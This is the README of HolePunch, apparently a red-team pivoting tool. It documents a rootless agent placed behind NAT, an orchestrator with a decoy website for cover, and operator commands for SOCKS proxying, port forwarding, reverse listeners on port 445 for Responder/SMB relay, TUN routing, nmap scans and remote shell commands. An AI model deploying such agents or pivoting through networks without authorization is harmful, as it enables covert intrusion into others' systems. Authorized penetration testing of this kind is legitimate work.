<p align="center">
  <img src="assets/holepunch.png" alt="HolePunch" width="220">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.24+-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go Version">
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License">
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-lightgrey?style=for-the-badge" alt="Platform">
</p>

<p align="center">UDP hole-punching VPN for network pivoting. Drop a rootless agent behind any NAT, punch through from your operator box via a public orchestrator, tunnel in.</p>

---

## Build

```bash
make build           # -> bin/holepunch-server, bin/holepunch-client
make release         # cross-compile linux/macos/windows
make test            # go test -race ./...
```

Requires Go 1.24+. When published, pre-built binaries are available on
[GitHub Releases](https://github.com/SubRosaLabs/HolePunch/releases).
See [RELEASING.md](RELEASING.md) for the obfuscated build and publishing process.

## How it works

The public orchestrator listens on **UDP/443**. Agents and operators register over **HTTP/3 over QUIC**, each using a local UDP socket that is also used for peer traffic. The server observes each client's public, NAT-mapped IP and port and introduces the peers to each other.

![Established HolePunch tunnel: the operator and agent exchange encrypted UDP through their NATs, the operator retains its server channel, and the agent forwards traffic to a private service.](assets/udp-holepunching.png)

<details>
<summary>Watch the six-stage UDP hole-punching walkthrough</summary>

![Animated walkthrough: register with the server, exchange peer endpoints and keys, potentially drop an early probe, send probes from both sides, establish the encrypted tunnel, and show a destination-dependent NAT failure.](assets/udp-holepunching.gif)

</details>

1. **Register.** Outbound QUIC traffic creates NAT state. The server learns each public endpoint; the operator authenticates with its Ed25519 key.
2. **Introduce.** The operator requests a session. The server sends each side a `PunchInit` containing the other peer's ID, X25519 public key, and public IP:port.
3. **Punch.** Both clients send five raw UDP `KeyExchange` probes, 50 ms apart, from their existing sockets. An early probe can be dropped before the other side sends. With compatible NAT mappings and filtering, outbound probes create state that admits peer packets.
4. **Tunnel.** Each peer computes an X25519 shared secret. Data is encrypted with **XChaCha20-Poly1305** and sent **directly between the peers over raw UDP**. SOCKS5, port forwarding, and TUN use this peer tunnel; the orchestrator carries no tunnel payload.
5. **Keep the path alive.** Peer keepalives run every 25 seconds. A connected agent closes its orchestration channel; the operator stays connected to discover and connect to other agents. The agent reconnects to the server if its last peer times out.

**NAT limitation:** reusing a local socket does not guarantee the same public mapping for every destination. A symmetric (destination-dependent) NAT may assign a different port for the peer than it did for the server, making the advertised endpoint unusable. Blocked outbound UDP can also prevent connection. There is no relay fallback in the current implementation.

The orchestrator can also serve a decoy website (`-webroot`) over HTTPS, with HTTP/1.1 and HTTP/2 support. Regular requests receive static files; clients POST to the configured agent path for orchestration.

## Quick start

There are three roles to HolePunch: The orchestration server, operators, and agents.
The Operator role is gated by an Ed25519 keypair, without a key the client runs as a passive agent, disabling operator commands.

| Role | Binary | Needs |
|---|---|---|
| Orchestrator | `holepunch-server` | Public IP, UDP/443 open inbound, `authorized_keys` file |
| Agent | `holepunch-client` | Outbound UDP only, no root, **no key** |
| Operator | `holepunch-client` | Ed25519 private key + sudo (TUN only) |

**0. One-time operator setup**

On your operator box, generate a keypair:

```bash
./holepunch-client -keygen ~/.holepunch/operator.key
```

Copy the printed line into `authorized_keys` on the orchestrator (one base64
pubkey per line).

**1. Orchestrator (public VPS)**

```bash
./holepunch-server
[HolePunch] >>
```

The default TLS mode is `self` (auto-generated self-signed cert). See
[TLS modes](#tls-modes) for Let's Encrypt and bring-your-own-cert options.

**2. Agent (target machine)**

```bash
./holepunch-client -server vps.example.com:443 -ignorecert
```

`-ignorecert` is required when the orchestrator uses the default self-signed
certificate. Omit it when using a real cert (`-tls-mode cert` or `letsencrypt`).

Passive - leave it running. No key means no operator commands in the shell
and no peer-list visibility; a captured binary can't enumerate the HolePunch fleet or
request punches.

**3. Operator (your box)**

```bash
sudo ./holepunch-client -server vps.example.com:443 -ignorecert \
     -key ~/.holepunch/operator.key
# Client ID: a4718a17447cc37b
[HolePunch] >> session 8964
Session: 8964d3cd
```

If `Operator authentication denied` shows instead, the orchestrator either
isn't running with your pubkey in its `authorized_keys` or the file's empty.
The agent shell still works but operator commands are gated off.

Once your session is established, pick a mode for HolePunch communications.

## Modes

### SOCKS5 (any OS, rootless)

TCP-only proxy. Works everywhere.

```
[HolePunch] >> socks start
SOCKS5 started: 127.0.0.1:1080
```

```bash
curl --socks5 127.0.0.1:1080 http://192.168.1.1
proxychains nmap -sT -Pn 192.168.1.0/24      # /etc/proxychains.conf -> socks5 127.0.0.1 1080
ssh -o ProxyCommand='nc -x 127.0.0.1:1080 %h %p' user@192.168.1.10
```

### Port forward (any OS, rootless)

Expose specific remote services locally.

```
[HolePunch] >> listener add 2222:192.168.1.10:22
Listener: 127.0.0.1:2222 -> 192.168.1.10:22
```

```bash
ssh -p 2222 user@localhost
```

### Reverse listener (any OS, rootless)

Expose a service running **on your operator box** through the agent. The agent
binds a public port; inbound connections are tunneled back and land on a local
address you specify. Useful for Responder, SMB relay, custom listeners, etc.

```
[HolePunch] >> rlistener add 445:127.0.0.1:445
Requesting agent to bind 0.0.0.0:445...
Reverse listener: agent:0.0.0.0:445 -> 127.0.0.1:445
```

Traffic flow:
```
External Box ──TCP──► Agent:445 ──tunnel──► Operator:127.0.0.1:445 ──► Your tool
```

Manage:
```
[HolePunch] >> rlistener list
Reverse Listeners:
  agent:0.0.0.0:445 -> 127.0.0.1:445

[HolePunch] >> rlistener del 445
Reverse listener removed: 445
```

### TUN (Linux operator, sudo)

Full L3 - run tools natively, no proxychains (Very similar to Ligolo-NG).

```
[HolePunch] >> tunnel start
Tunnel holepunch0 is up
[HolePunch] >> route add 192.168.1.0/24
Route added: 192.168.1.0/24 (AllowedIP for peer)
```

```bash
nmap -sT -Pn 192.168.1.0/24
ssh user@192.168.1.10
curl http://192.168.1.1
```

Target sees the agent's IP as source. Use `-sT` (connect scan); `-sS` needs raw sockets on your side and bypasses TUN.

### Cleanup

```
[HolePunch] >> tunnel stop
[HolePunch] >> socks stop
[HolePunch] >> listener del 2222
[HolePunch] >> quit
```

## TLS modes

The orchestrator requires TLS because QUIC mandates it. Three modes:

### `self` (default)

Generates a self-signed ECDSA certificate on every startup. No configuration
required, but agents must pass `-ignorecert`.

```bash
./holepunch-server -tls-mode self
```

### `cert`

Provide your own certificate and key files.

```bash
./holepunch-server -tls-mode cert \
    -tls-cert /etc/ssl/certs/server.crt \
    -tls-key  /etc/ssl/private/server.key
```

Agents connect normally, no `-ignorecert` needed when the cert is trusted.

### `letsencrypt`

Automatically obtain and renew a certificate from Let's Encrypt via ACME
TLS-ALPN-01. The orchestrator opens both UDP/443 (HTTP/3) and TCP/443 (for
ACME challenge completion). Your domain must resolve to the server's public IP.

```bash
./holepunch-server -tls-mode letsencrypt \
    -tls-domain orchestrator.example.com \
    -tls-cache  /var/cache/holepunch-certs
```

Agents connect without `-ignorecert`.

## Decoy website

Serve static files on the orchestation server to make the server look like a
normal HTTPS site to passive observers. Any path that isn't the agent path
returns the webroot content.

```bash
./holepunch-server -webroot /var/www/html
```

Browser → `https://orchestrator.example.com/` → sees your decoy HTML.  
Agent → `https://orchestrator.example.com/v1/metrics` → connects to fleet.

The agent path is configurable with `-agent-path` (default `/v1/metrics`).
**Both server and clients must use the same value.**

```bash
# Server
./holepunch-server -agent-path /api/health

# Agents and operator
./holepunch-client -server vps.example.com:443 -agent-path /api/health -ignorecert
```

## Commands

### Operator / agent

```
agents                          List discovered agents
session <id>                    Select agent (prefix match)

tunnel start | stop             TUN interface (Linux + sudo)
route add | del <cidr>          AllowedIP cryptokey routes
route list                      Show routes
ifconfig                        Show interface + peer state

socks start [port]              SOCKS5 proxy (default 1080)
socks stop

listener add <lp>:<host>:<rp>   Local port forward via agent
listener del <port>
listener list

rlistener add <bp>:<host>:<rp>  Agent binds port, forwards inbound to operator
rlistener del <port>
rlistener list

shell <command>                 Run one command through the selected agent

stats | version | help | quit
```

### Orchestrator

```
clients         List registered clients with endpoints, role, and last-seen
operators       List authorized operators and current connection status
stats           Traffic counters + uptime
version | help | quit
```

## Flags

### `holepunch-server`

```
-bind 0.0.0.0              Address to bind (default 0.0.0.0)
-port 443                  UDP port (default 443)
-max-clients 100           Maximum connected clients
-authorized-keys ./authorized_keys
                           Operator public keys (one base64 Ed25519 pubkey per line)

-tls-mode self|cert|letsencrypt
                           Certificate mode (default: self)
-tls-cert <path>           Certificate file  (cert mode)
-tls-key  <path>           Private key file  (cert mode)
-tls-domain <domain>       Domain for ACME   (letsencrypt mode)
-tls-cache ./cert-cache    Cert cache dir    (letsencrypt mode)

-agent-path /v1/metrics    HTTP path agents connect to (must match clients)
-webroot <path>            Serve this directory as a decoy website (optional)

-version                   Show version and exit
```

### `holepunch-client`

```
-server localhost:443      Orchestrator address (host:port)
-ignorecert                Skip TLS certificate verification
                           Required when server uses -tls-mode self
-agent-path /v1/metrics    HTTP path to connect on (must match server)
-key <path>                Ed25519 operator private key; omit to run as passive agent
-keygen <path>             Generate Ed25519 keypair at <path> and exit
-6                         Use IPv6
-version                   Show version and exit
```

## Limitations

- **TUN is Linux only.** macOS TUN is a stub, use SOCKS5/port forward there.
- **Symmetric NATs** may block the punch. If `session <id>` hangs, that's usually why.
- **`nmap -sS`** uses raw sockets on the operator and bypasses the tunnel — use `-sT`.
- **SOCKS5 UDP ASSOCIATE** is not implemented (TCP only).
- **Shell output is capped at 768 bytes** per command so it fits in one encrypted
  peer datagram; use concise commands or port forwarding for larger transfers.
- **IPv4 only** on the data plane (orchestrator coordination supports `-6`).
- **Agents are unauthenticated.** Anyone who runs the binary can register as an
  agent and show up in operators' peer lists. Operator auth only gates the
  ability to *use* the fleet, not to *join* it.
- **`-ignorecert` agents** trust the server's self-signed certificate. An
  on-path attacker who intercepts the QUIC handshake could impersonate the
  orchestrator, use `-tls-mode cert` or `letsencrypt` on production
  infrastructure where you need orchestrator-identity pinning.

## License

MIT — see [LICENSE](LICENSE).

---

<p align="center"><sub>Built for red-team pivoting. Use only on networks you're authorized to test.</sub></p>
